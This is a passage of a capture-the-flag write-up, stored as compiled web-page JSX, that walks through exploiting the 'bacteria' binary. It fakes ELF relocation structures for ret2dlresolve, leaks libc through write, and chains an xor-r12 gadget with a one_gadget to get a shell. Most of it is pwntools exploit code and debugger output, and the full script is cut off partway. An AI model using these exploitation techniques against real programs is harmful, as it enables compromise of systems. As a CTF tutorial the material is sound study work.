punctuation\",children:\"(\"}),\"reloc_arg\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})})}),`\n`,(0,e.jsx)(n.p,{children:\"and run with GDB attached for debuging:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/tsjctf-2022/bacteria/check_reloc_arg.png\",alt:\"check_reloc_arg.png\"})}),`\n`,(0,e.jsx)(n.p,{children:\"We can see that it send 0x20 bytes which fit read() so we are sure that every payload is sent correctly. Let\\u2019s run until we have inputed all struct and check with the reloc_arg:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/tsjctf-2022/bacteria/check_structures_position.png\",alt:\"check_structures_position.png\"})}),`\n`,(0,e.jsx)(n.p,{children:\"We can see that all of our struct are in the correct position. Now we just need an address of r_offset to puts the resolved function to it. We want when it has just resolved, it will print out the resolved address immediately. Which means when we have just write STRTAB structure, we will write the dlresolver to r_offset. After it resolve, it will print out the libc address which rsi is holding the pointer.\"}),`\n`,(0,e.jsxs)(n.p,{children:[\"So the dlresolver and r_offset is in the same address. Because we don\\u2019t want the JMPREL, SYMTAB and STRTAB structure to be overwriten or it might cause error. And also because dlresolve will use the lower stack address to resolve this so choosing lower address is an great idea. We will use address of \",(0,e.jsx)(n.code,{children:\"rw_section - 0x50\"}),\" for both r_offset and dlresolver so the stage 3 will change to this:\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"JMPREL \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x400300\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Elf64_Rela_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" rw_section \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x40\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"reloc_arg \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"int\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"Elf64_Rela_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),\" JMPREL\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"/\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"24\"}),\" \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"r_offset \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"rw_section \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x50\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"         \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Change here\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"r_info \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"symbol_number \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"<<\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"32\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x7\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# r_addend is null and stack is null already so we don\\u2019t need to write this,\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# also because we run out of 0x10 bytes we can write\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"Elf64_Rela_struct \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" r_offset \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),` r_info\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"And the rbp when writing STRTAB structure become this:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Write STRTAB structure\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"rw_section \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x50\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"         \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Fake rbp, write and jump to ret2dlresolve address\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"mov_rsi_rbp_read\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),` STRTAB_struct\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"send\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"Everything is set! Now we will conduct the ret2dlresolve by faking reloc_arg. To do that, we will need 3 things placed on stack: dlresolver address, reloc_arg and return address. The dlresolver address we can get by analize the read@plt:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/tsjctf-2022/bacteria/analize_read_plt.png\",alt:\"analize_read_plt.png\"})}),`\n`,(0,e.jsxs)(n.p,{children:[\"So the dlresolver address is \",(0,e.jsx)(n.code,{children:\"0x401000\"}),\", the reloc_arg is \",(0,e.jsx)(n.code,{children:\"632\"}),\" above and the return address of course is \",(0,e.jsx)(n.code,{children:\"mov_rsi_rbp_read\"}),\" because we will need to input something more.\"]}),`\n`,(0,e.jsx)(n.p,{children:\"After it writes STRTAB structure and jump to there, it then write to ret2dlresolve stack address and jump to ret2dlresolve address. With everything we have, the payload will look like this:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"dlresolver \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x401000\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"                         \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Fake rbp\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"dlresolver\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"               \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Resolve then execute resolved function\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"reloc_arg\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"mov_rsi_rbp_read\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"send\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Wait! The hint was we can use \",(0,e.jsx)(n.code,{children:\"write(0, buf, numofbyte)\"}),\" to print things out (rdi is always 0) so in the STRTAB structure, we will change from \",(0,e.jsx)(n.code,{children:\"system\"}),\" to \",(0,e.jsx)(n.code,{children:\"write\"}),\" to print out the resolved libc address. This is the updated of STRTAB structure:\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"STRTAB \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x4002c0\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"STRTAB_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" rw_section \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x80\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"st_name \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" STRTAB_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),` STRTAB\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"STRTAB_struct \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:'b\"write\\\\x00\\\\x00\\\\x00\"'}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"STRTAB_struct \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"Running script to here and debug with gdb, we know we ret2dlresolve successfully:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/tsjctf-2022/bacteria/get_write_libc_function.png\",alt:\"get_write_libc_function.png\"})}),`\n`,(0,e.jsx)(n.p,{children:\"This is the function write in libc. Let\\u2019s check if the rsi contain the address point to r_offset or not:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/tsjctf-2022/bacteria/rsi_contain_write_libc_address.png\",alt:\"rsi_contain_write_libc_address.png\"})}),`\n`,(0,e.jsx)(n.p,{children:\"And here it is! Running through the write function and we get the address of write leaked:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/tsjctf-2022/bacteria/write_address_leaked.png\",alt:\"write_address_leaked.png\"})}),`\n`,(0,e.jsx)(n.p,{children:\"Getting that leak and parsing it with the following code, we can get the libc base address:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Get leaked address\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"write_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" u64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"recv\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"8\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"log\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"success\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'Leak address: '\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"hex\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"write_addr\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"libc_base \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" write_addr \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"-\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x1111d0\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"log\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"success\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'Libc base: '\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" \",(0,e.jsx)(n.span,{className:\"token builtin\",children:\"hex\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"libc_base\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"Running script and we get this output:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/tsjctf-2022/bacteria/get_libc_base.png\",alt:\"get_libc_base.png\"})}),`\n`,(0,e.jsx)(n.p,{children:\"Check with libc in GDB and we get the same address:\"}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/tsjctf-2022/bacteria/get_libc_base_GDB.png\",alt:\"get_libc_base_GDB.png\"})}),`\n`,(0,e.jsx)(n.p,{children:\"What a long way! Let\\u2019s keep going cause we are very close to flag.\"}),`\n`,(0,e.jsxs)(n.h3,{id:\"stage-6-get-shell\",children:[(0,e.jsx)(n.a,{\"aria-hidden\":\"true\",tabIndex:\"-1\",href:\"#stage-6-get-shell\",children:(0,e.jsx)(n.span,{className:\"icon icon-link\"})}),\"Stage 6. Get shell\"]}),`\n`,(0,e.jsx)(n.p,{children:\"Now we will get the libc from container to our host and then find one gadget from it:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"$ \",(0,e.jsx)(n.span,{className:\"token function\",children:\"docker\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"ps\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`CONTAINER ID   IMAGE               COMMAND                  CREATED        STATUS       PORTS                    NAMES\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"3ac3689e6140   bacteria_bacteria   \",(0,e.jsx)(n.span,{className:\"token string\",children:'\"/usr/sbin/xinetd -d\\u2026\"'}),\"   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"12\"}),\" hours ago   Up \",(0,e.jsx)(n.span,{className:\"token number\",children:\"3\"}),\" hours   \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0.0\"}),\".0.0:9487-\",(0,e.jsx)(n.span,{className:\"token operator\",children:\">\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"9487\"}),`/tcp   bacteria_bacteria_1\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"$ \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# docker cp <CONTAINER ID>:<path/of/container> <path/of/host/machine>\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"$ \",(0,e.jsx)(n.span,{className:\"token function\",children:\"docker\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"cp\"}),\" 3ac3689e6140:/usr/lib/x86_64-linux-gnu/libc-2.31.so \",(0,e.jsx)(n.span,{className:\"token builtin class-name\",children:\".\"}),`\n`]})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"Using \",(0,e.jsx)(n.code,{children:\"one_gadget\"}),\" and we have the following gadget:\"]}),`\n`,(0,e.jsx)(n.p,{children:(0,e.jsx)(n.img,{src:\"/static/images/tsjctf-2022/bacteria/one_gadget.png\",alt:\"one_gadget.png\"})}),`\n`,(0,e.jsxs)(n.p,{children:[\"We will use the first one which has constraints are r12 and r15 have to be null. Examine the register and we can see that r15 is null already, all we need now is r12 have to be null. Everything is easy when we have libc. Using \",(0,e.jsx)(n.code,{children:\"ROPgadget\"}),\" and we can get this:\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-bash\",children:(0,e.jsxs)(n.code,{className:\"language-bash code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"$ ROPgadget --binary libc-2.31.so --ropchain \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"grep\"}),\" xor \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"grep\"}),\" r12 \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"|\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"grep\"}),` ret\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"..\"}),`.\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"..\"}),`.\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"0x00000000000d31f0 \",(0,e.jsx)(n.span,{className:\"token builtin class-name\",children:\":\"}),\" xor r12d, r12d \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\" mov rax, r12 \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),\" pop r12 \",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\";\"}),` ret\n`]})]})}),`\n`,(0,e.jsxs)(n.p,{children:[\"We will use this to clear the r12. I use xor because we don\\u2019t need to add those \",(0,e.jsx)(n.code,{children:\"p64(0)\"}),\" then pop in a limited space like this situation. Before we continue, let choose any address for rbp in the write of ret2dlresolve so that it will jump to there after the leak. I will choose the rw_section (because now we don\\u2019t need stack more) so the code for ret2dlresolve will look like this:\"]}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Conduct ret2dlresolve\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"dlresolver \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0x401000\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"rw_section\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"           \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Fake rbp, choose random writable address\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"dlresolver\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"          \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Dlresolver\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"reloc_arg\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"           \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Fake reloc_arg\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"mov_rsi_rbp_read\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"    \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Return address\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"send\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"And now, after the leak it will get input from us again. Just pass that xor 12 and one gadget, we created the shell:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"one_gadget \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0xe6c7e\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"xor_r12_pop_r12 \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" \",(0,e.jsx)(n.span,{className:\"token number\",children:\"0xd31f0\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"                               \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Fake rbp, not use more\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"libc_base \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" xor_r12_pop_r12\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"    \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# rip\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token number\",children:\"0\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"                              \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# For that pop r12\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"payload \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+=\"}),\" p64\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"libc_base \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"+\"}),\" one_gadget\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),\"         \",(0,e.jsx)(n.span,{className:\"token comment\",children:\"# Return address\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"send\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),\"payload\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"p\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"interactive\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]})]})}),`\n`,(0,e.jsx)(n.p,{children:\"Full code:\"}),`\n`,(0,e.jsx)(n.pre,{className:\"language-python\",children:(0,e.jsxs)(n.code,{className:\"language-python code-highlight\",children:[(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"import\"}),` subprocess\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"import\"}),` time\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"from\"}),\" pwn \",(0,e.jsx)(n.span,{className:\"token keyword\",children:\"import\"}),\" \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"*\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"context\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"binary \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" exe \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" ELF\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'./bacteria'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" checksec\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),(0,e.jsx)(n.span,{className:\"token boolean\",children:\"False\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token comment\",children:\"# context.log_level = 'debug'\"}),`\n`]}),(0,e.jsx)(n.span,{className:\"code-line\",children:`\n`}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[(0,e.jsx)(n.span,{className:\"token keyword\",children:\"def\"}),\" \",(0,e.jsx)(n.span,{className:\"token function\",children:\"GDB\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\":\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\tproc \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" subprocess\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"Popen\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"(\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"[\"}),(0,e.jsx)(n.span,{className:\"token string\",children:\"'ps'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" \",(0,e.jsx)(n.span,{className:\"token string\",children:\"'aux'\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\"]\"}),(0,e.jsx)(n.span,{className:\"token punctuation\",children:\",\"}),\" stdout\",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\"subprocess\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\".\"}),\"PIPE\",(0,e.jsx)(n.span,{className:\"token punctuation\",children:\")\"}),`\n`]}),(0,e.jsxs)(n.span,{className:\"code-line\",children:[\"\tps \",(0,e.jsx)(n.span,{className:\"token operator\",children:\"=\"}),\" 